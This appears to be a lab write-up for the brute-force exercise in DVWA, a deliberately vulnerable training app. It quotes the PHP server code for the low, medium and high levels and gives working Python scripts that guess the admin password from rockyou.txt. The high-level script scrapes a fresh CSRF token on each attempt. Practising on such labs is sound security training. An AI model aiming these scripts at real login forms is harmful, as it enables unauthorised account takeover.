# DVWA - Brute-Force

## Description

**Vulnerability:** Brute-force    
**Impact:** Brute-force and get the admin account credentials.

---

## LOW Security Level
This is the simple code I created to brute-force the admin account using `rockyou.txt` password lists.

*Change `PHPSESSID` to your own one.*

```python
import requests

baseUrl = "http://localhost/DVWA/vulnerabilities/brute/?Login=Login&username=admin"

cookies = {
    "PHPSESSID": "91fdcd96e5376633ef607edd0a1b8093",
    "security": "low"
}

try:    
    with open('/usr/share/wordlists/rockyou.txt') as file:
        for line in file:
            password = line.rstrip()
            url = baseUrl + f"&password={password}"
            
            try:
                print(f"Attempting: password={password}")
                res = requests.get(url, cookies=cookies)
                
                if "Username and/or password incorrect." not in res.text:
                    print()
                    print("=> Password found: ", password)
                    exit()
            except requests.exceptions.RequestException as e:
                print("Request error:", e)
                continue
except FileNotFoundError as e:
    print("File not found:", e)
```

## MEDIUM Security Level
The only difference between LOW and MEDIUM level is in the `Login failed` if logic:
```php
// Login failed
sleep( 2 );
echo "<pre><br />Username and/or password incorrect.</pre>";
```

If we submit wrong credentials instead of immediately pop up an error message it will wait for 2 seconds, so we can use the same code as LOW Security level to brute-force the admin account.

## HIGH Security Level
This level add a `CSRF Token` in order to prevent attackers from freely brute-force the account if you inspect the form you can see a new input

```html
<input type="hidden" name="user_token" value="CHANGE_EVERY_TIME_RELOAD_THE_PAGE">
```

The server will check this created `user_token` before doing the authentication logic and this token is required. The server code:

```php
// Check Anti-CSRF token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

Also, this `sleep` function will make the response become slower when we submit a wrong credentials
```php
// Login failed
sleep( rand( 0, 3 ) );
echo "<pre><br />Username and/or password incorrect.</pre>";
```

The workflow is this:
1. First make a GET request to page and take the created `user_token`.
2. Use that `user_token` to make a brute-force request trying the password.
3. If failed continue make a GET request to get new `user_token` and brute-force again.

Exploitation code:
```python
import requests
import re

baseUrl = "http://localhost/DVWA/vulnerabilities/brute/"

cookies = {
    "PHPSESSID": "91fdcd96e5376633ef607edd0a1b8093",
    "security": "high"
}

pattern = r"name='user_token' value='([a-fA-F0-9]+)'"

try:    
    with open('/usr/share/wordlists/rockyou.txt') as file:
        for line in file:
            password = line.rstrip()
            url = baseUrl + f"?Login=Login&username=admin&password={password}"
            
            try:
                # Take CSRF Token
                res = requests.get(baseUrl, cookies=cookies)

                match = re.search(pattern, res.text)
                if match:
                    token = match.group(1)
                    
                    url += f"&user_token={token}"
                else:
                    print("Failed to taken token")
                    continue

                # Brute-force password
                print(f"Attempting: password={password}")
                res = requests.get(url, cookies=cookies)

                if "Username and/or password incorrect." not in res.text:
                    print()
                    print("=> Password found: ", password)
                    exit()
            except requests.exceptions.RequestException as e:
                print("Request error:", e)
                continue
except FileNotFoundError as e:
    print("File not found:", e)
```

## Resources
- https://owasp.org/www-community/attacks/Brute_force_attack
- https://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password
- https://www.golinuxcloud.com/brute-force-attack-web-forms
